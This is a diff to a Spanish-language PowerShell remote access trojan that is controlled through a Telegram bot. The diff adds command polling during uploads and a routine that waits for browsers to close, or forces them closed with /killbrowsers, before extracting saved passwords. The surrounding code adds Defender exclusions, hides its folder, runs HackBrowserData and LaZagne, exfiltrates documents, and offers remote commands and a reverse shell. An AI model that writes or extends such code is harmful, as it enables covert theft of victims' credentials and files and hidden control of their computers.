@@ -3,6 +3,8 @@
     - Claves por parametro -Token / -ChatId o desde config.ini
     - 100% ASCII (sin emojis)
     - Extraccion NATIVA de passwords de navegadores (fallback de hackbrowserdata)
+    - Comandos VIVOS durante el envio de documentos (sondeo entre archivos)
+    - Espera a que se cierren los navegadores (no los mata) - /killbrowsers para forzar
     - Pausar/Reanudar/Cancelar por comandos MANUALES
     - Salidas de comandos / ls / dir en .txt
     - /edit sobrescribe el archivo original
@@ -60,6 +62,11 @@ $script:PwWaitNotified        = $false
 $script:EditFiles             = @{}
 $script:DocQueue              = New-Object System.Collections.ArrayList
 
+# === SONDO DE TELEGRAM (para comandos vivos durante el envio) ===
+$script:LastUpdateId          = 0
+$script:Polling               = $false
+$script:FetchDepth            = 0
+
 New-Item -ItemType Directory -Path $BaseDir   -Force -ErrorAction SilentlyContinue | Out-Null
 New-Item -ItemType Directory -Path $UploadDir -Force -ErrorAction SilentlyContinue | Out-Null
 
@@ -81,7 +88,6 @@ function Add-AvExclusions {
         Add-MpPreference -ExclusionProcess "wscript.exe" -ErrorAction SilentlyContinue
         if (Test-Path $HackPath)    { Add-MpPreference -ExclusionPath $HackPath    -ErrorAction SilentlyContinue }
         if (Test-Path $LaZagnePath) { Add-MpPreference -ExclusionPath $LaZagnePath -ErrorAction SilentlyContinue }
-        # Atributos ocultos/sistema para que no lo toquen
         attrib +h +s +r $BaseDir 2>$null
         Write-Log "Exclusiones de Defender aplicadas."
     } catch { Write-Log "No se pudieron aplicar exclusiones: $($_.Exception.Message)" }
@@ -114,7 +120,7 @@ function Answer-Callback {
     } catch {}
 }
 
-# === ENVIO DE ARCHIVOS (cola si esta pausado) ===
+# === ENVIO DE ARCHIVOS (cola si esta pausado + sondeo de comandos) ===
 function Send-File {
     param([string]$Path, [string]$Caption = "")
     if (-not (Test-Path $Path)) { return $false }
@@ -124,7 +130,10 @@ function Send-File {
         Write-Log "PAUSADO -> cola: $(Split-Path $Path -Leaf) (total: $($script:FileQueue.Count))"
         return $true
     }
-    return (Send-File-Now -Path $Path -Caption $Caption)
+    $ok = Send-File-Now -Path $Path -Caption $Caption
+    # Mientras se envian documentos, seguimos atendiendo comandos de Telegram
+    if (-not $script:Polling) { Poll-Updates 0 }
+    return $ok
 }
 
 function Send-File-Now {
@@ -163,9 +172,46 @@ function Test-BrowsersOpen {
     $p = Get-Process $names -ErrorAction SilentlyContinue
     return (@($p).Count -gt 0)
 }
+
+function Get-OpenBrowserNames {
+    $p = Get-Process chrome,msedge,firefox,brave,opera,opera_gx,vivaldi,chromium -ErrorAction SilentlyContinue
+    return (($p | Select-Object -Expand ProcessName -Unique) -join ", ")
+}
+
 function Stop-Browsers {
     Get-Process chrome,msedge,firefox,brave,opera,opera_gx,vivaldi,chromium -ErrorAction SilentlyContinue |
         Stop-Process -Force -ErrorAction SilentlyContinue
+}
+
+function Kill-Browsers {
+    $antes = Get-OpenBrowserNames
+    Stop-Browsers
+    Start-Sleep -Seconds 2
+    Send-Message -Text "Navegadores forzados a cerrar. Antes: $antes"
+}
+
+# Espera a que TODOS los navegadores se cierren SIN matarlos.
+# Sigue procesando comandos de Telegram mientras espera.
+function Wait-BrowsersClosed {
+    param([int]$MaxWaitSec = 0)   # 0 = infinito
+    $start = Get-Date
+    $notified = $false
+    $lastReminder = Get-Date
+    while (Test-BrowsersOpen) {
+        if (-not $notified) {
+            Send-Message -Text "Navegadores abiertos detectados. NO los cierro: esperando a que se cierren para extraer passwords. (Usa /killbrowsers para forzarlos.)"
+            $notified = $true
+        }
+        Fetch-Updates 0
+        Start-Sleep -Seconds 3
+        if (((Get-Date) - $lastReminder).TotalSeconds -ge 60) {
+            $lastReminder = Get-Date
+            Send-Message -Text "Sigo esperando a que cierres: $(Get-OpenBrowserNames)"
+        }
+        if ($MaxWaitSec -gt 0 -and ((Get-Date) - $start).TotalSeconds -ge $MaxWaitSec) { break }
+    }
+    if ($notified) { Send-Message -Text "Navegadores cerrados. Continuando." }
+    return (-not (Test-BrowsersOpen))
 }
 
 # === CAPTURA PANTALLA ===
@@ -645,8 +691,10 @@ function Extract-FirefoxPasswords {
 }
 
 # === EXTRAER PASSWORDS (prioridad) ===
+# NO cierra los navegadores: espera a que se cierren (verifica). Sigue atendiendo comandos.
 function Run-Passwords {
-    Send-Message -Text "=== PASSWORDS (prioridad) ===`nCerrando navegadores y extrayendo..."
+    Wait-BrowsersClosed
+    Send-Message -Text "=== PASSWORDS (prioridad) ===`nNavegadores cerrados. Extrayendo..."
     $all = @()
     try { $all += Extract-ChromiumPasswords } catch { Write-Log "Chromium native: $_" }
     try { $all += Extract-FirefoxPasswords } catch { Write-Log "Firefox native: $_" }
@@ -665,9 +713,8 @@ function Run-Passwords {
         Send-Message -Text "Extraccion nativa sin resultados. Probando HackBrowserData..."
     }
 
-    # Respaldo con HackBrowserData (todos los tipos)
+    # Respaldo con HackBrowserData (todos los tipos) - ya estan cerrados
     if (Test-Path $HackPath) {
-        Stop-Browsers; Start-Sleep -Seconds 2
         $o = "$env:TEMP\pw_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
         New-Item -ItemType Directory -Path $o -Force | Out-Null
         try {
@@ -693,7 +740,7 @@ function Run-HackBrowserData-Phase {
     $intentos = 0; $max = 5
     while ($script:ArchivosHBDEnviados -lt 8 -and $intentos -lt $max) {
         $intentos++
-        Stop-Browsers; Start-Sleep -Seconds 3
+        Wait-BrowsersClosed
         $outDir = "$env:TEMP\hbd_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$intentos"
         New-Item -ItemType Directory -Path $outDir -Force | Out-Null
         try {
@@ -896,7 +943,6 @@ function Handle-IncomingFile {
             $destino = $script:EditFiles[$key]
             $dir = Split-Path $destino -Parent
             if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
-            # Sobrescritura real del archivo original
             Invoke-WebRequest -Uri $url -OutFile $destino -TimeoutSec 300
             $script:EditFiles.Remove($key); Save-State
             $mb = [math]::Round((Get-Item $destino).Length/1MB,2)
@@ -984,7 +1030,45 @@ function Check-AutoSteal {
     }
 }
 
-# === MENU (sin botones de pausa/reanudar/cancelar) ===
+# ==========================================================
+#  SONDEO DE TELEGRAM (mantiene el bot vivo durante el envio)
+# ==========================================================
+function Fetch-Updates {
+    param([int]$Timeout = 0)
+    if ($script:FetchDepth -gt 3) { return }
+    $script:FetchDepth++
+    try {
+        $resp = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($script:LastUpdateId+1)&timeout=$Timeout" -TimeoutSec ($Timeout + 30)
+        if ($resp.ok -and $resp.result.Count -gt 0) {
+            foreach ($upd in $resp.result) {
+                $script:LastUpdateId = $upd.update_id
+                try {
+                    if ($upd.callback_query) {
+                        Answer-Callback -Id $upd.callback_query.id
+                        if ([string]$upd.callback_query.message.chat.id -eq $ChatId) { Process-Cmd -Text $upd.callback_query.data -UpdateId $upd.update_id }
+                        continue
+                    }
+                    if ($upd.message -and ([string]$upd.message.chat.id -eq $ChatId)) {
+                        if ($upd.message.text) { Process-Cmd -Text $upd.message.text -UpdateId $upd.update_id }
+                        elseif ($upd.message.document -or $upd.message.photo) { Handle-IncomingFile -Message $upd.message }
+                    }
+                } catch { Write-Log "Error update: $($_.Exception.Message)" }
+            }
+        }
+    } catch {
+        $e = $_.Exception.Message
+        if ($e -notlike "*409*") { Write-Log "Error poll: $e" }
+    } finally { $script:FetchDepth-- }
+}
+
+function Poll-Updates {
+    param([int]$Timeout = 0)
+    if ($script:Polling) { return }
+    $script:Polling = $true
+    try { Fetch-Updates $Timeout } finally { $script:Polling = $false }
+}
+
+# === MENU ===
 function Send-Menu {
     $kb = @{
         inline_keyboard = @(
@@ -992,7 +1076,8 @@ function Send-Menu {
             @( @{text="Passwords";callback_data="/passwords"}, @{text="Documentos";callback_data="/files"} ),
             @( @{text="HBD";callback_data="/hack"}, @{text="LaZagne";callback_data="/lazagne"} ),
             @( @{text="PWD";callback_data="/pwd"}, @{text="LS";callback_data="/ls"} ),
-            @( @{text="Ciclo";callback_data="/steal"}, @{text="Actualizar";callback_data="/update"} )
+            @( @{text="Ciclo";callback_data="/steal"}, @{text="Actualizar";callback_data="/update"} ),
+            @( @{text="Cerrar Navegadores";callback_data="/killbrowsers"} )
         )
     }
     Send-Message-Buttons -Text "Menu - usa botones o escribe comandos manuales" -Keyboard $kb
@@ -1023,6 +1108,7 @@ function Process-Cmd {
 COMANDOS:
 INFO: /info /pwd /ls [ruta] /dir [ruta] /cd <ruta> /cat <archivo> /status
 ACCIONES: /captura /cmd <comando> /run <exe> [args]
+NAVEGADORES: /killbrowsers  (fuerza el cierre; por defecto se espera a que cierren)
 ARCHIVOS: /mkdir /md <carpeta> /rm /mv <o> <d> /cp <o> <d> /write <f> <txt>
 EDITAR: /edit <archivo>  (te lo mando, lo modificas, lo reenvias y se sobrescribe)
 TRANSFERIR: /download <ruta>
@@ -1031,7 +1117,7 @@ CONTROL MANUAL: /pause /resume /cancelar
 OTROS: /update /shell <ip> [puerto] /stopshell /menu
 "@ }
         "/info"     { Send-Message -Text (Get-Info) }
-        "/status"   { Send-Message -Text "Dir: $script:CurrentDir`nPausado: $($script:SendPaused)`nCancelado: $($script:SendCancelled)`nCola: $($script:FileQueue.Count)`nShell: $($script:ReverseShellActive)`nPasswords auto: $($script:PwAutoDone)" }
+        "/status"   { Send-Message -Text "Dir: $script:CurrentDir`nPausado: $($script:SendPaused)`nCancelado: $($script:SendCancelled)`nCola: $($script:FileQueue.Count)`nShell: $($script:ReverseShellActive)`nPasswords auto: $($script:PwAutoDone)`nNavAbiertos: $(Get-OpenBrowserNames)" }
         "/pwd"      { Send-Message -Text "Dir: $script:CurrentDir" }
         "/ls"       { Cmd-Ls $cmdArgs }
         "/dir"      { Cmd-Ls $cmdArgs }
@@ -1058,6 +1144,8 @@ OTROS: /update /shell <ip> [puerto] /stopshell /menu
         "/lazagne"  { $script:LaZagneCompleted=$false; Run-LaZagne-Phase }
         "/files"    { $script:FilesExfiltrated=$false; Exfiltrate-Documents }
         "/passwords" { Run-Passwords }
+
+        "/killbrowsers" { Kill-Browsers }
 
         # --- CONTROL MANUAL (sin botones) ---
         "/pause"    { $script:SendPaused = $true;  Send-Message -Text "Envio PAUSADO (manual). Los archivos van a la cola. Usa /resume para continuar." }
@@ -1093,14 +1181,15 @@ if ($script:PwPending) { Send-Message -Text "Extraccion automatica de passwords 
 
 try { Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null; Start-Sleep -Seconds 2 } catch {}
 
-$lastId = 0
 $ultimoCheck = Get-Date
 while ($true) {
     try {
+        $esperandoNav = $false
         if ($script:PwPending -and -not $script:PwAutoDone) {
             if (Test-BrowsersOpen) {
+                $esperandoNav = $true
                 if (-not $script:PwWaitNotified) {
-                    Send-Message -Text "Hay navegadores abiertos. Esperando a que los cierres para extraer passwords..."
+                    Send-Message -Text "Hay navegadores abiertos. Esperando a que los cierres para extraer passwords (NO los cierro). Usa /killbrowsers para forzarlos."
                     $script:PwWaitNotified = $true
                 }
             } else {
@@ -1112,21 +1201,7 @@ while ($true) {
             }
         }
 
-        $resp = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastId+1)&timeout=25" -TimeoutSec 60
-        if ($resp.ok -and $resp.result.Count -gt 0) {
-            foreach ($upd in $resp.result) {
-                $lastId = $upd.update_id
-                if ($upd.callback_query) {
-                    Answer-Callback -Id $upd.callback_query.id
-                    if ([string]$upd.callback_query.message.chat.id -eq $ChatId) { Process-Cmd -Text $upd.callback_query.data -UpdateId $upd.update_id }
-                    continue
-                }
-                if ($upd.message -and ([string]$upd.message.chat.id -eq $ChatId)) {
-                    if ($upd.message.text) { Process-Cmd -Text $upd.message.text -UpdateId $upd.update_id }
-                    elseif ($upd.message.document -or $upd.message.photo) { Handle-IncomingFile -Message $upd.message }
-                }
-            }
-        }
+        if ($esperandoNav) { Poll-Updates 5 } else { Poll-Updates 25 }
 
         if (((Get-Date) - $ultimoCheck).TotalMinutes -ge 60) { $ultimoCheck = Get-Date; if ($script:PwAutoDone) { Check-AutoSteal } }
     } catch {
@@ -1134,5 +1209,5 @@ while ($true) {
         if ($e -notlike "*409*") { Write-Log "Error loop: $e" }
         Start-Sleep -Seconds 2
     }
-    Start-Sleep -Milliseconds 500
+    Start-Sleep -Milliseconds 300
 }
